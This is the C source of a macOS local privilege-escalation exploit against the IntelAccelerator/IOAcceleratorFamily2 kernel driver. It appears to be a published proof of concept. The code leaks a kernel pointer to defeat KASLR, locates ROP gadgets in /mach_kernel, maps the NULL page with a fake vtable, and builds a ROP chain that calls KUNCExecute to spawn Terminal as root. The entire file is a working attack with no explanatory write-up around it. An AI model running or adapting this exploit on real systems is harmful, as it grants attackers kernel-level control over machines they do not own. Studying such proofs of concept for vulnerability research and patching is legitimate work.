// clang -o ig_2_3_exploit ig_2_3_exploit.c -framework IOKit -framework CoreFoundation -m32 -D_FORTIFY_SOURCE=0
// ianbeer
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
 
#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
 
uint64_t kernel_symbol(char* sym){
  char cmd[1024];
  strcpy(cmd, "nm -g /mach_kernel | grep ");
  strcat(cmd, sym);
  strcat(cmd, " | cut -d' ' -f1");
  FILE* f = popen(cmd, "r");
  char offset_str[17];
  fread(offset_str, 16, 1, f);
  pclose(f); 
  offset_str[16] = '\x00';
 
  uint64_t offset = strtoull(offset_str, NULL, 16);
  return offset;
}
 
uint64_t leaked_offset_in_kext(){
  FILE* f = popen("nm -g /System/Library/Extensions/IONDRVSupport.kext/IONDRVSupport | grep __ZTV17IONDRVFramebuffer | cut -d' ' -f1", "r");
  char offset_str[17];
  fread(offset_str, 16, 1, f);
  pclose(f); 
  offset_str[16] = '\x00';
 
  uint64_t offset = strtoull(offset_str, NULL, 16);
  offset += 0x10; //offset from symbol to leaked pointer
  return offset;
}
 
 
uint64_t leak(){
  io_iterator_t iter;
   
  CFTypeRef p = IORegistryEntrySearchCFProperty(IORegistryGetRootEntry(kIOMasterPortDefault),
                                               kIOServicePlane,
                                               CFSTR("AAPL,iokit-ndrv"),
                                               kCFAllocatorDefault,
                                               kIORegistryIterateRecursively);
 
  if (CFGetTypeID(p) != CFDataGetTypeID()){
    printf("expected CFData\n");
    return 1;
  }
 
  if (CFDataGetLength(p) != 8){
    printf("expected 8 bytes\n");
    return 1;
  }
 
  uint64_t leaked = *((uint64_t*)CFDataGetBytePtr(p));
  return leaked;
}
 
extern CFDictionaryRef OSKextCopyLoadedKextInfo(CFArrayRef, CFArrayRef);
 
uint64_t kext_load_addr(char* target_name){
  uint64_t addr = 0;
  CFDictionaryRef kd = OSKextCopyLoadedKextInfo(NULL, NULL);
  CFIndex count = CFDictionaryGetCount(kd);
   
  void **keys;
  void **values;
   
  keys = (void **)malloc(sizeof(void *) * count);
  values = (void **)malloc(sizeof(void *) * count);
   
  CFDictionaryGetKeysAndValues(kd,
                               (const void **)keys,
                               (const void **)values);
 
  for(CFIndex i = 0; i < count; i++){
    const char *name = CFStringGetCStringPtr(CFDictionaryGetValue(values[i], CFSTR("CFBundleIdentifier")), kCFStringEncodingMacRoman);
    if (strcmp(name, target_name) == 0){
      CFNumberGetValue(CFDictionaryGetValue(values[i],
                       CFSTR("OSBundleLoadAddress")),
                       kCFNumberSInt64Type,
                       &addr);
      printf("%s: 0x%016llx\n", name, addr);
      break;
    }
  }
  return addr;
 
}
 
uint64_t load_addr(){
  uint64_t addr = 0;
  CFDictionaryRef kd = OSKextCopyLoadedKextInfo(NULL, NULL);
  CFIndex count = CFDictionaryGetCount(kd);
   
  void **keys;
  void **values;
   
  keys = (void **)malloc(sizeof(void *) * count);
  values = (void **)malloc(sizeof(void *) * count);
   
  CFDictionaryGetKeysAndValues(kd,
                               (const void **)keys,
                               (const void **)values);
 
  for(CFIndex i = 0; i < count; i++){
    const char *name = CFStringGetCStringPtr(CFDictionaryGetValue(values[i], CFSTR("CFBundleIdentifier")), kCFStringEncodingMacRoman);
    if (strcmp(name, "com.apple.iokit.IONDRVSupport") == 0){
      CFNumberGetValue(CFDictionaryGetValue(values[i],
                       CFSTR("OSBundleLoadAddress")),
                       kCFNumberSInt64Type,
                       &addr);
      printf("%s: 0x%016llx\n", name, addr);
      break;
    }
  }
  return addr;
}
 
uint64_t* build_vtable(uint64_t kaslr_slide, size_t* len){
  uint64_t kernel_base = 0xffffff8000200000;
  kernel_base += kaslr_slide;
     
  int fd = open("/mach_kernel", O_RDONLY);
  if (!fd)
    return NULL;
 
  struct stat _stat;
  fstat(fd, &_stat);
  size_t buf_len = _stat.st_size;
 
  uint8_t* buf = mmap(NULL, buf_len, PROT_READ, MAP_FILE|MAP_PRIVATE, fd, 0);
 
  if (!buf)
    return NULL;
 
  /*
  this stack pivot to rax seems to be reliably present across mavericks versions:
    push rax
    add [rax], eax
    add [rbx+0x41], bl
    pop rsp
    pop r14
    pop r15
    pop rbp
    ret
  */
  uint8_t pivot_gadget_bytes[] = {0x50, 0x01, 0x00, 0x00, 0x5b, 0x41, 0x5c, 0x41, 0x5e};
  uint8_t* pivot_loc = memmem(buf, buf_len, pivot_gadget_bytes, sizeof(pivot_gadget_bytes));
  uint64_t pivot_gadget_offset = (uint64_t)(pivot_loc - buf);
  printf("offset of pivot gadget: %p\n", pivot_gadget_offset);
  uint64_t pivot = kernel_base + pivot_gadget_offset;
 
  /*
    pop rdi
    ret
  */
  uint8_t pop_rdi_ret_gadget_bytes[] = {0x5f, 0xc3};
  uint8_t* pop_rdi_ret_loc = memmem(buf, buf_len, pop_rdi_ret_gadget_bytes, sizeof(pop_rdi_ret_gadget_bytes));
  uint64_t pop_rdi_ret_gadget_offset = (uint64_t)(pop_rdi_ret_loc - buf);
  printf("offset of pop_rdi_ret gadget: %p\n", pop_rdi_ret_gadget_offset);
  uint64_t pop_rdi_ret = kernel_base + pop_rdi_ret_gadget_offset;
   
  /*
    pop rsi
    ret
  */
  uint8_t pop_rsi_ret_gadget_bytes[] = {0x5e, 0xc3};
  uint8_t* pop_rsi_ret_loc = memmem(buf, buf_len, pop_rsi_ret_gadget_bytes, sizeof(pop_rsi_ret_gadget_bytes));
  uint64_t pop_rsi_ret_gadget_offset = (uint64_t)(pop_rsi_ret_loc - buf);
  printf("offset of pop_rsi_ret gadget: %p\n", pop_rsi_ret_gadget_offset);
  uint64_t pop_rsi_ret = kernel_base + pop_rsi_ret_gadget_offset;
   
  /*
    pop rdx
    ret
  */
  uint8_t pop_rdx_ret_gadget_bytes[] = {0x5a, 0xc3};
  uint8_t* pop_rdx_ret_loc = memmem(buf, buf_len, pop_rdx_ret_gadget_bytes, sizeof(pop_rdx_ret_gadget_bytes));
  uint64_t pop_rdx_ret_gadget_offset = (uint64_t)(pop_rdx_ret_loc - buf);
  printf("offset of pop_rdx_ret gadget: %p\n", pop_rdx_ret_gadget_offset);
  uint64_t pop_rdx_ret = kernel_base + pop_rdx_ret_gadget_offset;
 
  munmap(buf, buf_len);
  close(fd);
 
 
  /*
    in IOAcceleratorFamily2
    two locks are held - r12 survives the pivot, this should unlock all the locks from there:
__text:0000000000006F80                 lea     rsi, unk_32223
__text:0000000000006F87                 mov     rbx, [r12+118h]
__text:0000000000006F8F                 mov     rax, [rbx]
__text:0000000000006F92                 mov     rdi, rbx
__text:0000000000006F95                 xor     edx, edx
__text:0000000000006F97                 call    qword ptr [rax+858h]
__text:0000000000006F9D                 mov     rdi, rbx        ; this
__text:0000000000006FA0                 call    __ZN22IOGraphicsAccelerator211unlock_busyEv ; IOGraphicsAccelerator2::unlock_busy(void)
__text:0000000000006FA5                 mov     rdi, [rbx+88h]
__text:0000000000006FAC                 call    _IOLockUnlock
__text:0000000000006FB1
__text:0000000000006FB1 loc_6FB1:                               ; CODE XREF: IOAccelContext2::clientMemoryForType(uint,uint *,IOMemoryDescriptor **)+650j
__text:0000000000006FB1                 xor     ecx, ecx
__text:0000000000006FB3                 jmp     loc_68BC
...
__text:00000000000068BC                 mov     eax, ecx        ; jumptable 00000000000067F1 default case
__text:00000000000068BE                 add     rsp, 38h
__text:00000000000068C2                 pop     rbx
__text:00000000000068C3                 pop     r12
__text:00000000000068C5                 pop     r13
__text:00000000000068C7                 pop     r14
__text:00000000000068C9                 pop     r15
__text:00000000000068CB                 pop     rbp
__text:00000000000068CC                 retn
  */
  uint64_t unlock_locks = kext_load_addr("com.apple.iokit.IOAcceleratorFamily2") + kaslr_slide + 0x6f80;
 
  printf("0x%016llx\n", unlock_locks);
 
  uint64_t KUNCExecute = kernel_symbol("_KUNCExecute") + kaslr_slide;
  uint64_t thread_exception_return = kernel_symbol("_thread_exception_return") + kaslr_slide;
   
  //char* payload = "/Applications/Calculator.app/Contents/MacOS/Calculator";
  char* payload = "/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal";
 
  uint64_t rop_stack[] = {
    0,                //pop r14
    0,                //pop r15 
    0,                //pop rbp  +10
    unlock_locks,
    pivot,            //+20  virtual call is rax+20
    0, //+10
    0, //+18
    0,
    0, //+28
    0,
    0, //+38
    0, //pop rbx
    0, //pop r12
    0, //pop r13
    0, //pop r14
    0, //pop r15
    0, //pop rbp
    pop_rdi_ret,
    (uint64_t)payload,
    pop_rsi_ret,
    0,
    pop_rdx_ret,
    0,
    KUNCExecute,
    thread_exception_return
  };
 
  uint64_t* r = malloc(sizeof(rop_stack));
  memcpy(r, rop_stack, sizeof(rop_stack));
  *len = sizeof(rop_stack);
  return r;
}
 
void trigger(void* vtable, size_t vtable_len){
  //need to overallocate and touch the pages since this will be the stack:
  mach_vm_address_t addr = 0x41420000 - 10 * 0x1000;
  mach_vm_allocate(mach_task_self(), &addr, 0x20*0x1000, 0);
 
  memset(addr, 0, 0x20*0x1000);
  memcpy((void*)0x41420000, vtable, vtable_len);
 
  //map NULL page
  vm_deallocate(mach_task_self(), 0x0, 0x1000);
  addr = 0;
  vm_allocate(mach_task_self(), &addr, 0x1000, 0);
  char* np = 0;
  for (int i = 0; i < 0x1000; i++){
    np[i] = 'A';
  }
 
  volatile uint64_t* zero = 0;
  *zero = 0x41420000;
 
  //trigger vuln
  CFMutableDictionaryRef matching = IOServiceMatching("IntelAccelerator");
  io_iterator_t iterator;
  kern_return_t err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
   
  io_service_t service = IOIteratorNext(iterator);
  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 2, &conn);
 
  addr = 0x12345000;
  mach_vm_size_t size = 0x1000;
 
  err = IOConnectMapMemory(conn, 3, mach_task_self(), &addr, &size, kIOMapAnywhere);
}
 
int main() {
  uint64_t leaked_ptr = leak();
  uint64_t kext_load_addr = load_addr();
 
  // get the offset of that pointer in the kext:
  uint64_t offset = leaked_offset_in_kext();
 
  // sanity check the leaked address against the symbol addr:
  if ( (leaked_ptr & 0xfff) != (offset & 0xfff) ){
    printf("the leaked pointer doesn't match up with the expected symbol offset\n");
    return 1;
  }
   
  uint64_t kaslr_slide = (leaked_ptr - offset) - kext_load_addr;
   
  printf("kaslr slide: %p\n", kaslr_slide);
 
  size_t vtable_len = 0;
  void* vtable = build_vtable(kaslr_slide, &vtable_len);
 
  trigger(vtable, vtable_len);
 
  return 0;                           
}
